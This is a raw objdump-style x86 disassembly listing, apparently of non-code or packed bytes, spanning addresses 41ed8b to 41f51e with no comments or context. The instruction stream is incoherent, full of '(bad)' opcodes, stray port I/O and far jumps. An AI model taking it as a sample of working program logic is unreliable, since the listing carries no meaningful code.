  41ed8b:	mov    ds:0x6a730534,eax
  41ed90:	rcr    BYTE PTR [edx],0x8c
  41ed93:	in     al,dx
  41ed94:	imul   DWORD PTR [ecx+0x2f]
  41ed97:	mov    edi,0x8f01c06e
  41ed9c:	sbb    cl,BYTE PTR [esi-0x3c3d83b]
  41eda2:	inc    ecx
  41eda3:	xchg   edi,eax
  41eda4:	mov    ecx,DWORD PTR [edi+0x532bf9cc]
  41edaa:	xor    eax,0x7aa80b37
  41edaf:	int    0x2f
  41edb1:	in     eax,dx
  41edb2:	fwait
  41edb3:	jnp    0x41ed56
  41edb5:	pushf  
  41edb6:	fisub  WORD PTR [ecx+edx*4]
  41edb9:	shr    DWORD PTR [eax-0x3b0218ed],cl
  41edbf:	sbb    ch,BYTE PTR [esi]
  41edc1:	pop    ss
  41edc2:	and    BYTE PTR [ecx+0x48],cl
  41edc5:	sbb    dl,dl
  41edc7:	sar    edx,cl
  41edc9:	ss pop eax
  41edcb:	dec    edx
  41edcc:	push   es
  41edcd:	xor    eax,0xb984474
  41edd2:	in     eax,0x50
  41edd4:	popf   
  41edd5:	cmp    BYTE PTR ds:0xb6c25f9,cl
  41eddb:	push   DWORD PTR [eax+0x47b0c8]
	...
  41ede9:	add    BYTE PTR [eax],al
  41edeb:	fucomi st,st(5)
  41eded:	outs   dx,BYTE PTR ds:[esi]
  41edee:	and    bh,BYTE PTR [esi-0x5d]
  41edf1:	(bad)  
  41edf3:	pop    esi
  41edf4:	(bad)  
  41edf5:	mov    DWORD PTR [ebp-0xf141523],ecx
  41edfb:	jg     0x41ed8d
  41edfd:	add    DWORD PTR [eax],eax
  41edff:	lods   eax,DWORD PTR ds:[esi]
  41ee00:	add    BYTE PTR [eax],al
  41ee02:	add    bl,dh
  41ee04:	(bad)  
  41ee05:	stos   DWORD PTR es:[edi],eax
  41ee06:	test   ebp,eax
  41ee08:	sub    DWORD PTR [ebx],ebp
  41ee0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee0b:	mov    ah,0x8a
  41ee0d:	outs   dx,BYTE PTR ds:[esi]
  41ee0e:	(bad)  
  41ee0f:	mov    ds:0xe4d90df3,al
  41ee14:	icebp  
  41ee15:	pop    ebp
  41ee16:	jle    0x41eda0
  41ee18:	mov    esi,0x4557f8aa
  41ee1d:	outs   dx,WORD PTR ds:[esi]
  41ee1f:	lahf   
  41ee20:	rcr    DWORD PTR [eax],1
  41ee22:	aam    0x9c
  41ee24:	ins    DWORD PTR es:[edi],dx
  41ee25:	mov    DWORD PTR [esp+edi*8+0x65],edx
  41ee29:	mov    esp,0xa0c84ec
  41ee2e:	or     esi,DWORD PTR [eax+0x4d641a4a]
  41ee34:	dec    ebx
  41ee35:	dec    esp
  41ee36:	and    edx,DWORD PTR [ebx-0x46]
  41ee39:	(bad)  
  41ee3a:	les    edx,FWORD PTR [ebp+0x5]
  41ee3d:	or     ebp,ebp
  41ee3f:	adc    eax,0xcf669549
  41ee44:	leave  
  41ee45:	(bad)
  41ee48:	cwde   
  41ee49:	mov    WORD PTR [ebx+eax*1-0x40],fs
  41ee4d:	sub    dl,BYTE PTR [eax]
  41ee4f:	sbb    ebp,ebp
  41ee51:	ret    
  41ee52:	jle    0x41ee08
  41ee54:	and    DWORD PTR [ebx-0x12],ecx
  41ee57:	pop    edx
  41ee58:	lahf   
  41ee59:	into   
  41ee5a:	cld    
  41ee5b:	xchg   ecx,eax
  41ee5c:	xor    DWORD PTR [ebx+eax*4],edx
  41ee5f:	lock xor esp,0xffffff9f
  41ee63:	imul   esi,DWORD PTR [edi+0x53eebd86],0x2054aa7e
  41ee6d:	xor    edi,ecx
  41ee6f:	add    al,0xf7
  41ee71:	pop    ecx
  41ee72:	ss inc eax
  41ee74:	outs   dx,BYTE PTR ds:[esi]
  41ee75:	ds mov edx,0x24e27552
  41ee7b:	and    BYTE PTR [eax-0x4a],bl
  41ee7e:	push   ss
  41ee7f:	or     ah,BYTE PTR [esi+ebp*1+0x32ef5aa]
  41ee86:	jnp    0x41ee3f
  41ee88:	lds    ebp,FWORD PTR [eax-0x44740fbf]
  41ee8e:	pop    edi
  41ee8f:	sub    BYTE PTR [ebx],0x52
  41ee92:	cwde   
  41ee93:	pop    ds
  41ee94:	mov    ?,WORD PTR [ecx+0x4a]
  41ee97:	jp     0x41ee33
  41ee99:	xor    DWORD PTR [edx+0x7aa98507],edi
  41ee9f:	lods   eax,DWORD PTR ds:[esi]
  41eea0:	jmp    0xe278:0x9bb5f6dd
  41eea7:	iret   
  41eea8:	test   al,0xf3
  41eeaa:	stc    
  41eeab:	xor    DWORD PTR [edx+0xf45ed9],ecx
	...
  41eeb9:	add    BYTE PTR [eax],al
  41eebb:	add    eax,0x6f976b22
  41eec0:	(bad)  
  41eec2:	mov    dl,0x66
  41eec4:	and    BYTE PTR [esi-0x2cdae396],ah
  41eeca:	dec    edi
  41eecb:	sub    al,0x91
  41eecd:	add    DWORD PTR [eax],eax
  41eecf:	lods   eax,DWORD PTR ds:[esi]
  41eed0:	add    BYTE PTR [eax],al
  41eed2:	add    BYTE PTR [ebx],dh
  41eed4:	mov    ebx,0x164a695
  41eed9:	addr16 retf 0xe218
  41eedd:	mov    al,ds:0xa1f8d5ed
  41eee2:	jnp    0x41ef2f
  41eee4:	lea    edx,[ebp-0x721cf64e]
  41eeea:	lods   al,BYTE PTR ds:[esi]
  41eeeb:	stc    
  41eeec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eeed:	cwde   
  41eeee:	das    
  41eeef:	shl    DWORD PTR ds:0xc0eed067,0xac
  41eef6:	rol    DWORD PTR [ecx+0x3a],1
  41eef9:	out    dx,eax
  41eefa:	adc    al,0xa9
  41eefc:	cmp    ecx,ecx
  41eefe:	cli    
  41eeff:	sub    eax,DWORD PTR [esi]
  41ef01:	mov    dl,0x79
  41ef03:	xchg   edi,eax
  41ef04:	daa    
  41ef05:	push   ss
  41ef06:	pusha  
  41ef07:	imul   esp,edx,0xffffffbb
  41ef0a:	pop    es
  41ef0b:	int    0x33
  41ef0d:	nop
  41ef0e:	fstp   DWORD PTR [edx]
  41ef10:	bound  eax,QWORD PTR [ecx]
  41ef12:	adc    ecx,DWORD PTR [edi+0x32680f03]
  41ef18:	mov    dl,0x89
  41ef1a:	adc    dl,al
  41ef1c:	in     al,0x5a
  41ef1e:	jmp    DWORD PTR [edx]
  41ef20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef21:	lahf   
  41ef22:	push   0x71
  41ef24:	cmp    ebp,ebx
  41ef26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef27:	jne    0x41eeef
  41ef29:	or     eax,0x4c4d5190
  41ef2e:	rcr    eax,cl
  41ef30:	(bad)  
  41ef31:	ja     0x41eeec
  41ef33:	push   cs
  41ef34:	xor    dl,BYTE PTR [eax-0x28bb2d40]
  41ef3a:	stos   BYTE PTR es:[edi],al
  41ef3b:	iret   
  41ef3c:	fisubr DWORD PTR [edx-0x5e534aa3]
  41ef42:	and    BYTE PTR [eax-0x57],bl
  41ef45:	mov    dl,0xa
  41ef47:	fwait
  41ef48:	adc    BYTE PTR [esi+0x34],0xc6
  41ef4c:	outs   dx,DWORD PTR ds:[esi]
  41ef4d:	cmp    BYTE PTR [eax],ah
  41ef4f:	jl     0x41eed5
  41ef51:	and    al,0xb5
  41ef53:	in     eax,0x94
  41ef55:	jbe    0x41efd6
  41ef57:	jno    0x41ef9e
  41ef59:	mov    bl,0x36
  41ef5b:	call   0xfd1a6937
  41ef60:	cmp    esi,DWORD PTR [ebx+0xb]
  41ef63:	fnsave [edx]
  41ef65:	sub    bh,BYTE PTR [ebp+0x64f8defc]
  41ef6b:	fsubr  st,st(5)
  41ef6d:	mov    eax,0x2f8480be
  41ef72:	(bad)  
  41ef73:	fldenv [ebx+0x16]
  41ef76:	hlt    
  41ef77:	cli    
  41ef78:	jo     0x41ef70
  41ef7a:	jno    0x41ef0c
  41ef7c:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef7e:	mov    ecx,0x80
	...
  41ef8b:	mov    edx,esp
  41ef8d:	and    al,0xd9
  41ef8f:	jg     0x41ef8a
  41ef91:	call   esi
  41ef93:	into   
  41ef94:	inc    ebp
  41ef95:	mov    bh,0x11
  41ef97:	addr16 mov dh,0x4
  41ef9a:	adc    ebx,ecx
  41ef9c:	xchg   ecx,eax
  41ef9d:	add    DWORD PTR [eax],eax
  41ef9f:	lods   eax,DWORD PTR ds:[esi]
  41efa0:	add    BYTE PTR [eax],al
  41efa2:	add    BYTE PTR [ebx+esi*1-0x39999a3c],ah
  41efa9:	jg     0x41ef7e
  41efab:	dec    ecx
  41efac:	aam    0xd
  41efae:	adc    al,0xc4
  41efb0:	cmc    
  41efb1:	ins    DWORD PTR es:[di],dx
  41efb3:	pop    ss
  41efb4:	out    dx,eax
  41efb5:	and    DWORD PTR [esi-0x9aaf069],ecx
  41efbb:	cmp    ebp,DWORD PTR [eax+0x63]
  41efbe:	lahf   
  41efbf:	pop    ebp
  41efc0:	mov    ebx,edx
  41efc2:	jl     0x41efdd
  41efc4:	mov    cl,0x1c
  41efc6:	push   eax
  41efc7:	in     al,0xad
  41efc9:	sbb    al,0xb5
  41efcb:	ret    0xb0bb
  41efce:	lods   eax,DWORD PTR ds:[esi]
  41efcf:	inc    esi
  41efd0:	or     DWORD PTR [edx+edi*1+0x2a78017b],edx
  41efd7:	lea    edx,[eax-0x4c]
  41efda:	das    
  41efdb:	xchg   ebp,eax
  41efdc:	cmp    eax,0xaa79b920
  41efe1:	mov    WORD PTR [edx],?
  41efe3:	adc    eax,0xd3a189e0
  41efe8:	(bad)  
  41efe9:	adc    DWORD PTR [ebx],esi
  41efeb:	rcr    BYTE PTR [eax+0x5927962a],cl
  41eff1:	test   al,0xe6
  41eff3:	rcl    BYTE PTR [ecx+0x25d69747],0xcd
  41effa:	idiv   DWORD PTR [eax]
  41effc:	gs lock data16 jns 0x41efcf
  41f001:	xchg   DWORD PTR [ecx-0x7e],edx
  41f004:	fucom  st(5)
  41f006:	leave  
  41f007:	sub    al,0x86
  41f009:	outs   dx,DWORD PTR ds:[esi]
  41f00a:	push   esp
  41f00b:	mov    ?,eax
  41f00d:	xlat   BYTE PTR ds:[ebx]
  41f00e:	pop    esp
  41f00f:	retf   0xd5c2
  41f012:	mov    bl,0xb1
  41f014:	push   0xffffffa7
  41f016:	and    DWORD PTR [ebx],esi
  41f018:	mov    ecx,0xc265b9c5
  41f01d:	lock ret 0xf3ae
  41f021:	jno    0x41f093
  41f023:	ss add eax,0xae9c5077
  41f029:	adc    al,0x14
  41f02b:	dec    ebp
  41f02c:	loop   0x41f04c
  41f02e:	jecxz  0x41efe2
  41f030:	out    dx,eax
  41f031:	inc    ecx
  41f032:	pushf  
  41f033:	daa    
  41f034:	lahf   
  41f035:	outs   dx,BYTE PTR ds:[esi]
  41f036:	rcr    BYTE PTR [edx-0x19],cl
  41f039:	jns    0x41f01a
  41f03b:	popf   
  41f03c:	ret    0x9fd1
  41f03f:	idiv   DWORD PTR [esi+0x5f6d331b]
  41f045:	(bad)  
  41f046:	cmp    BYTE PTR [edx-0x37d3cc7e],bl
  41f04c:	dec    ebp
  41f04d:	fadd   DWORD PTR [edi]
  41f04f:	repz add BYTE PTR [eax],al
	...
  41f05a:	add    dh,bl
  41f05c:	sub    DWORD PTR [eax-0x210c002e],ebx
  41f062:	sub    eax,0x4af35f6
  41f067:	imul   esp,DWORD PTR [edx-0x55],0x19286b9
  41f06e:	add    BYTE PTR [ebp+0x7b000000],ch
  41f074:	xchg   esi,eax
  41f075:	fidiv  WORD PTR [ebp+eiz*4-0x25]
  41f079:	xchg   BYTE PTR [edx-0x10],al
  41f07c:	mov    ebx,DWORD PTR [edx-0x328abe5a]
  41f082:	pop    edx
  41f083:	int3   
  41f084:	es aam 0x1a
  41f087:	(bad)
  41f08a:	or     ebx,esi
  41f08c:	mov    eax,ds:0x89040233
  41f091:	popa   
  41f092:	loopne 0x41f05d
  41f094:	mov    esp,0xb90ed289
  41f099:	lahf   
  41f09a:	jecxz  0x41f07f
  41f09c:	dec    eax
  41f09d:	in     eax,dx
  41f09e:	push   ebx
  41f09f:	cld    
  41f0a0:	mov    ah,0x7
  41f0a2:	iret   
  41f0a3:	jmp    0x2d6a:0xcd35fdc6
  41f0aa:	(bad)  
  41f0ab:	cs into 
  41f0ad:	call   0x23c2:0xd1cb6abf
  41f0b4:	ins    DWORD PTR es:[edi],dx
  41f0b5:	lahf   
  41f0b6:	xor    BYTE PTR [edi],ah
  41f0b8:	adc    ebx,DWORD PTR [ebx-0x7e]
  41f0bb:	and    eax,0xf4b8b789
  41f0c0:	sahf   
  41f0c1:	xchg   esp,eax
  41f0c2:	xor    al,0xbe
  41f0c4:	int3   
  41f0c5:	imul   edi,eax,0x2d
  41f0c8:	inc    ebp
  41f0c9:	out    0x21,eax
  41f0cb:	lock mov ebx,edx
  41f0ce:	sub    DWORD PTR [eax-0x63a08e31],edx
  41f0d4:	cmp    eax,0x3a6e4c1a
  41f0d9:	in     al,0x58
  41f0db:	enter  0xb874,0x44
  41f0df:	cmp    DWORD PTR [esi-0x62],eax
  41f0e2:	xor    edx,esp
  41f0e4:	shr    BYTE PTR [esp+edi*4+0x353fca5e],1
  41f0eb:	(bad)  
  41f0ec:	scas   al,BYTE PTR es:[edi]
  41f0ed:	xchg   edi,eax
  41f0ee:	mov    ds:0xea020774,eax
  41f0f3:	push   ds
  41f0f4:	leave  
  41f0f5:	add    DWORD PTR [edx-0xa],edx
  41f0f8:	dec    edi
  41f0f9:	add    DWORD PTR [ebx+edi*4],edi
  41f0fc:	and    edi,DWORD PTR [ecx+eax*8]
  41f0ff:	cmp    BYTE PTR [ecx+0x52],cl
  41f102:	add    dh,BYTE PTR [ebp-0x5a971c77]
  41f108:	xor    DWORD PTR [ecx+0x7283273b],esp
  41f10e:	xchg   edi,eax
  41f10f:	leave  
  41f110:	je     0x41f188
  41f112:	sbb    bl,bh
  41f114:	not    BYTE PTR ds:0xb11d3968
  41f11a:	xchg   BYTE PTR [edx+edi*8],bl
  41f11d:	(bad)  
  41f11e:	loopne 0x41f0f8
	...
  41f128:	add    BYTE PTR [eax],al
  41f12a:	add    BYTE PTR [esi+0x3f],cl
  41f12d:	int3   
  41f12e:	sbb    eax,0x7fdffffd
  41f133:	out    dx,eax
  41f134:	loopne 0x41f14c
  41f136:	lods   al,BYTE PTR ds:[esi]
  41f137:	test   eax,0x33a48c91
  41f13c:	xchg   ebx,eax
  41f13d:	add    DWORD PTR [eax],eax
  41f13f:	lods   eax,DWORD PTR ds:[esi]
  41f140:	add    BYTE PTR [eax],al
  41f142:	add    BYTE PTR [eax],bl
  41f144:	fwait
  41f145:	(bad)  
  41f146:	sti    
  41f147:	js     0x41f19b
  41f149:	xchg   ebp,eax
  41f14a:	in     eax,0x45
  41f14c:	dec    esi
  41f14d:	dec    ebp
  41f14e:	repz mov edi,0x6aa3f772
  41f154:	add    al,0x9f
  41f156:	into   
  41f157:	shl    BYTE PTR [ebp+0x79922e68],cl
  41f15d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f15e:	in     al,dx
  41f15f:	lods   al,BYTE PTR ds:[esi]
  41f160:	test   al,0x23
  41f162:	das    
  41f163:	mov    BYTE PTR [eax-0x14b9b33d],0xcb
  41f16a:	cmp    dh,dh
  41f16c:	test   BYTE PTR [esi-0x6df0951e],dh
  41f172:	out    0x37,al
  41f174:	enter  0x9734,0x66
  41f178:	test   eax,0xc647b53f
  41f17d:	xchg   edx,eax
  41f17e:	mov    DWORD PTR [esi-0x5f],edi
  41f181:	outs   dx,DWORD PTR ds:[esi]
  41f182:	xchg   ebx,eax
  41f183:	lock jmp 0x41f1f2
  41f186:	add    eax,0xc202a2ed
  41f18b:	cmp    DWORD PTR [ebx],ebx
  41f18d:	mov    dh,BYTE PTR [edi]
  41f18f:	mov    bl,0xec
  41f191:	cmp    ebx,DWORD PTR [edi+eiz*2+0x25dd004c]
  41f198:	cmp    eax,0x8ad93872
  41f19d:	repz mov ebp,ss
  41f1a0:	jae    0x41f1ec
  41f1a2:	add    al,BYTE PTR [ecx]
  41f1a4:	xchg   DWORD PTR [edx+0x2e],edx
  41f1a7:	push   cs
  41f1a8:	iret   
  41f1a9:	mov    BYTE PTR [edi-0x7e391ed3],0xb9
  41f1b0:	mov    dh,0x25
  41f1b2:	xchg   esp,eax
  41f1b3:	out    0x77,eax
  41f1b5:	clc    
  41f1b6:	push   ebx
  41f1b7:	mov    gs,WORD PTR [eax+0x9]
  41f1ba:	cmc    
  41f1bb:	sub    BYTE PTR [edi],bl
  41f1bd:	enter  0xbc2d,0xea
  41f1c1:	ja     0x41f227
  41f1c3:	or     al,0xd2
  41f1c5:	dec    eax
  41f1c6:	(bad)  
  41f1c7:	and    al,0x80
  41f1c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1ca:	mov    ds:0x43e4a01e,al
  41f1cf:	jb     0x41f20c
  41f1d1:	cmp    esp,ecx
  41f1d3:	int3   
  41f1d4:	mov    ds:0xa3ae9607,al
  41f1d9:	cmp    cx,WORD PTR [edx-0x5f7ecbc1]
  41f1e0:	bound  edi,QWORD PTR [ebp+0x11]
  41f1e3:	push   edx
  41f1e4:	idiv   DWORD PTR [esi]
  41f1e6:	cdq    
  41f1e7:	push   ebx
  41f1e8:	push   ss
  41f1e9:	pop    eax
  41f1ea:	pop    edi
  41f1eb:	pop    esi
  41f1ec:	lock jno 0x41f1a8
  41f1ef:	pop    edi
	...
  41f1f8:	add    BYTE PTR [eax],al
  41f1fa:	add    BYTE PTR [esi],bl
  41f1fc:	test   eax,0x7ff735f6
  41f201:	fild   QWORD PTR [ebx-0x5f9ed871]
  41f207:	sub    al,0xce
  41f209:	adc    al,0x5a
  41f20b:	loopne 0x41f1a0
  41f20d:	add    DWORD PTR [eax],eax
  41f20f:	lods   eax,DWORD PTR ds:[esi]
  41f210:	add    BYTE PTR [eax],al
  41f212:	add    BYTE PTR [edx+0x68],al
  41f215:	mov    edi,0xe26fef37
  41f21a:	cmp    cl,bl
  41f21c:	leave  
  41f21d:	(bad)  
  41f21e:	pop    esi
  41f21f:	imul   edi,DWORD PTR [ebp+0x6f3ba85c],0xa43d822f
  41f229:	sbb    dh,BYTE PTR [esi+0x7e]
  41f22c:	adc    BYTE PTR [edx+0x7a3a4cdb],ah
  41f232:	mov    dh,0xf2
  41f234:	mov    ch,BYTE PTR [ebp-0x5a2827cb]
  41f23a:	std    
  41f23b:	adc    esp,eax
  41f23d:	sahf   
  41f23e:	aaa    
  41f23f:	into   
  41f240:	dec    edx
  41f241:	xor    cl,dh
  41f243:	push   ds
  41f244:	js     0x41f268
  41f246:	sti    
  41f247:	jge    0x41f272
  41f249:	bnd lock jp 0x41f1e3
  41f24d:	mov    edx,0x411206d4
  41f252:	lock xor BYTE PTR [edx+edi*4+0x5e],ah
  41f257:	pop    edi
  41f258:	jo     0x41f1e6
  41f25a:	repnz mov ch,BYTE PTR [esi]
  41f25d:	test   BYTE PTR [ecx-0x21fcfa68],ch
  41f263:	retf   
  41f264:	xchg   edx,eax
  41f265:	je     0x41f2ab
  41f267:	or     al,BYTE PTR [ecx-0xbff6ccf]
  41f26d:	aaa    
  41f26e:	scas   eax,DWORD PTR es:[edi]
  41f26f:	mov    esp,0xc8d4115
  41f274:	ja     0x41f2f3
  41f276:	cmp    cl,bl
  41f278:	sahf   
  41f279:	loopne 0x41f271
  41f27b:	pop    esp
  41f27c:	push   0x3d1d6d5
  41f281:	outs   dx,DWORD PTR ds:[esi]
  41f282:	cmp    al,0x78
  41f284:	sub    edx,esi
  41f286:	cmp    DWORD PTR ds:0xe2cb4220,edi
  41f28c:	out    0xd,al
  41f28e:	xchg   esi,eax
  41f28f:	xchg   DWORD PTR [eax+0x4ef9af60],ecx
  41f295:	mov    esi,0x869cd27a
  41f29a:	xchg   esi,eax
  41f29b:	js     0x41f316
  41f29d:	mov    bh,0xfa
  41f29f:	xor    bh,BYTE PTR [esi+0x3e5e44f1]
  41f2a5:	(bad)  
  41f2a6:	fsub   QWORD PTR ds:0x629dc9ec
  41f2ac:	xor    BYTE PTR [ecx+eax*8-0x3358b8fc],0xe
  41f2b4:	ins    DWORD PTR es:[edi],dx
  41f2b5:	inc    ebp
  41f2b6:	aam    0x70
  41f2b8:	imul   BYTE PTR [ebp+edi*4+0x7e8cda02]
  41f2bf:	repnz add BYTE PTR [eax],al
	...
  41f2ca:	add    BYTE PTR [ebx+0x7f2d6de1],bl
  41f2d0:	lods   eax,DWORD PTR ds:[esi]
  41f2d1:	fcomi  st,st(7)
  41f2d3:	sar    BYTE PTR [ebx],cl
  41f2d5:	(bad)  
  41f2d6:	add    dl,bl
  41f2d8:	add    eax,0x948d68e8
  41f2dd:	add    DWORD PTR [eax],eax
  41f2df:	lods   eax,DWORD PTR ds:[esi]
  41f2e0:	add    BYTE PTR [eax],al
  41f2e2:	add    ah,dh
  41f2e4:	nop
  41f2e5:	sbb    al,0x94
  41f2e7:	adc    eax,0xc8fda18e
  41f2ec:	ins    BYTE PTR es:[edi],dx
  41f2ed:	sub    eax,0x74487ab3
  41f2f2:	mov    ch,0x9
  41f2f4:	push   ebx
  41f2f5:	dec    ebp
  41f2f6:	test   DWORD PTR [esi+0x3b08e12b],ecx
  41f2fc:	fild   WORD PTR [ecx+0x2dc40026]
  41f302:	loope  0x41f36d
  41f304:	mov    DWORD PTR [edx+ebx*2],0x4c592701
  41f30b:	leave  
  41f30c:	inc    ebx
  41f30d:	ins    BYTE PTR es:[edi],dx
  41f30e:	xchg   DWORD PTR [edx],esi
  41f310:	out    dx,eax
  41f311:	les    ebp,FWORD PTR [esi-0x78]
  41f314:	out    0xaa,eax
  41f316:	test   eax,0x71b9b185
  41f31b:	push   eax
  41f31c:	repz je 0x41f2ff
  41f31f:	mov    al,0x33
  41f321:	mov    dh,ah
  41f323:	or     eax,eax
  41f325:	adc    BYTE PTR [edx-0x5559f0dd],0x3a
  41f32c:	sbb    al,ah
  41f32e:	idiv   dl
  41f330:	sub    eax,edi
  41f332:	sub    bh,BYTE PTR [ecx-0x66]
  41f335:	shl    DWORD PTR [edx],cl
  41f337:	fwait
  41f338:	or     al,bh
  41f33a:	rol    dl,1
  41f33c:	jg     0x41f398
  41f33e:	icebp  
  41f33f:	inc    ebx
  41f340:	ins    DWORD PTR es:[edi],dx
  41f341:	les    esp,FWORD PTR [eax-0x5f]
  41f344:	lods   al,BYTE PTR ds:[esi]
  41f345:	int3   
  41f346:	ret    0x3fe5
  41f349:	aaa    
  41f34a:	imul   ecx,ebp,0xffffffd4
  41f34d:	int    0x5c
  41f34f:	out    dx,eax
  41f350:	pop    edx
  41f351:	loope  0x41f32c
  41f353:	(bad)  
  41f354:	scas   eax,DWORD PTR es:[edi]
  41f355:	push   eax
  41f356:	sti    
  41f357:	sub    BYTE PTR [ebx+esi*4],ah
  41f35a:	push   cs
  41f35b:	imul   DWORD PTR [edi-0x74a60076]
  41f361:	mov    ebp,gs
  41f363:	add    al,BYTE PTR [esi+0x36f4aea7]
  41f369:	and    DWORD PTR [esi+0x6a],0x32
  41f36d:	les    ebp,FWORD PTR [ebp+0x5]
  41f370:	push   cs
  41f371:	jl     0x41f36a
  41f373:	cmp    al,0x40
  41f375:	jns    0x41f34d
  41f377:	dec    esi
  41f378:	int    0xdc
  41f37a:	aaa    
  41f37b:	xchg   ebx,eax
  41f37c:	pop    eax
  41f37d:	xor    BYTE PTR [esi],0x2c
  41f380:	inc    ebp
  41f381:	(bad)  
  41f382:	std    
  41f383:	loop   0x41f35c
  41f385:	jmp    0xa736:0x9965
  41f38b:	pop    es
  41f38c:	imul   esi,DWORD PTR [edi+0x98b],0x0
  41f396:	add    BYTE PTR [eax],al
  41f398:	add    BYTE PTR [eax],al
  41f39a:	add    BYTE PTR [eax],cl
  41f39c:	div    DWORD PTR [edi+0x4a]
  41f39f:	dec    edx
  41f3a1:	cmp    eax,0x2e8eedf7
  41f3a6:	dec    eax
  41f3a7:	mov    ds:0x3a8b7a5e,al
  41f3ac:	xchg   ebp,eax
  41f3ad:	add    DWORD PTR [eax],eax
  41f3af:	lods   eax,DWORD PTR ds:[esi]
  41f3b0:	add    BYTE PTR [eax],al
  41f3b2:	add    BYTE PTR [eax],dl
  41f3b4:	test   DWORD PTR [edx-0x5285b08e],0xd7252eb6
  41f3be:	dec    esi
  41f3bf:	shl    eax,0xfc
  41f3c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3c3:	and    BYTE PTR [esp+ebp*2+0x50],0x60
  41f3c8:	jmp    0x1baf:0xf19516c5
  41f3cf:	push   ss
  41f3d0:	jmp    0x49ac:0x510ef748
  41f3d7:	xchg   ebp,eax
  41f3d8:	mov    WORD PTR [edi],fs
  41f3da:	xchg   ah,al
  41f3dc:	pop    eax
  41f3dd:	sar    dh,1
  41f3df:	mov    eax,0x1c06d600
  41f3e4:	call   0x6ab887a
  41f3e9:	dec    edx
  41f3ea:	fild   WORD PTR [edi+eax*1+0x6b]
  41f3ee:	pop    ecx
  41f3ef:	add    al,0xbd
  41f3f1:	add    ecx,DWORD PTR [eax+0x934c583]
  41f3f7:	ret    
  41f3f8:	int3   
  41f3f9:	pop    ss
  41f3fa:	push   ds
  41f3fb:	in     eax,0x56
  41f3fd:	inc    eax
  41f3fe:	fild   DWORD PTR [ebx]
  41f400:	push   0x174e59aa
  41f405:	das    
  41f406:	test   DWORD PTR [ebp+0x597726a4],edx
  41f40c:	sbb    DWORD PTR [eax+0x67],0xffffffc7
  41f410:	sahf   
  41f411:	mov    ds,WORD PTR [ecx-0x2d]
  41f414:	out    dx,eax
  41f415:	adc    al,BYTE PTR [ebp-0x26]
  41f418:	jno    0x41f408
  41f41a:	cdq    
  41f41b:	dec    edx
  41f41c:	pop    esi
  41f41d:	jb     0x41f3b5
  41f41f:	popf   
  41f420:	cmp    bh,al
  41f422:	dec    cl
  41f424:	push   edi
  41f425:	cli    
  41f426:	xchg   ebp,eax
  41f427:	fnstenv [ebp-0x24655d9c]
  41f42d:	aad    0xfd
  41f42f:	fsubr  QWORD PTR [ebx+0x75]
  41f432:	arpl   WORD PTR [ebx-0x5a],bx
  41f435:	pop    ss
  41f436:	stc    
  41f437:	mov    dl,0xab
  41f439:	dec    esp
  41f43a:	jmp    0x3aa2d1ec
  41f43f:	ins    DWORD PTR es:[edi],dx
  41f440:	push   ebp
  41f441:	fsubr  QWORD PTR [ecx-0x30b131d5]
  41f447:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f448:	add    DWORD PTR [eax-0x7c],esp
  41f44b:	mov    esp,0x98bea0e3
  41f450:	sbb    ch,BYTE PTR ds:0xffb1a68d
  41f456:	mov    DWORD PTR [edi-0x45],esi
  41f459:	push   ebx
  41f45a:	nop
  41f45b:	mov    ebp,0xc2634ab
	...
  41f468:	add    BYTE PTR [eax],al
  41f46a:	add    BYTE PTR [esi],dh
  41f46c:	arpl   WORD PTR [eax-0x10],bp
  41f46f:	jge    0x41f46c
  41f471:	mov    esi,0x8c7853e7
  41f476:	daa    
  41f477:	sub    al,0x2f
  41f479:	cmc    
  41f47a:	daa    
  41f47b:	out    0x95,eax
  41f47d:	add    DWORD PTR [eax],eax
  41f47f:	lods   eax,DWORD PTR ds:[esi]
  41f480:	add    BYTE PTR [eax],al
  41f482:	add    BYTE PTR [esi],bh
  41f484:	mov    esi,0xbffaa24b
  41f489:	arpl   WORD PTR [ebp+0x7cff3c11],dx
  41f48f:	cdq    
  41f490:	jmp    0x3c6e7963
  41f495:	in     al,dx
  41f496:	xchg   DWORD PTR [esp+ecx*2+0x47],eax
  41f49a:	xchg   esi,eax
  41f49b:	mov    WORD PTR [ebp-0x1c78cef3],gs
  41f4a1:	fwait
  41f4a2:	rcr    BYTE PTR [edx+0x21c4a4de],1
  41f4a8:	int    0x51
  41f4aa:	add    eax,DWORD PTR [esi]
  41f4ac:	pushf  
  41f4ad:	vcvtsi2sd xmm4,xmm3,edx
  41f4b1:	or     DWORD PTR [ebx+ebp*1+0x1857383a],0xe76e868d
  41f4bc:	loop   0x41f469
  41f4be:	sbb    BYTE PTR [ecx],dh
  41f4c0:	fs loope 0x41f448
  41f4c3:	pop    edx
  41f4c4:	lods   al,BYTE PTR ds:[esi]
  41f4c5:	or     al,0xb4
  41f4c7:	jmp    0x9ca6:0xf20644ce
  41f4ce:	add    eax,0x5c3c2fdb
  41f4d3:	mov    dl,0x11
  41f4d5:	or     DWORD PTR [ebp+edx*8+0x7ce7e3ff],eax
  41f4dc:	and    al,0x57
  41f4de:	ins    BYTE PTR es:[edi],dx
  41f4df:	fst    QWORD PTR [edx+ebp*1+0x2d41d239]
  41f4e6:	push   edi
  41f4e7:	adc    BYTE PTR [eax-0x2e9bc20],dl
  41f4ed:	stc    
  41f4ee:	jo     0x41f562
  41f4f0:	push   edi
  41f4f1:	ret    0xfae8
  41f4f4:	int    0xc1
  41f4f6:	or     ecx,ecx
  41f4f8:	sbb    al,0x14
  41f4fa:	and    eax,0xd7cc0f87
  41f4ff:	sbb    eax,0x967e40d3
  41f504:	mov    dl,0x5c
  41f506:	jo     0x41f504
  41f508:	jnp    0x41f4fd
  41f50a:	std    
  41f50b:	and    BYTE PTR [ebx+0x42],ah
  41f50e:	inc    ecx
  41f50f:	jmp    0x41f4cc
  41f511:	pop    esp
  41f512:	repz xor eax,0xf2b4e052
  41f518:	nop
  41f519:	jb     0x41f54b
  41f51b:	jl     0x41f513
  41f51d:	ins    DWORD PTR es:[edi],dx
  41f51e:	pop    es
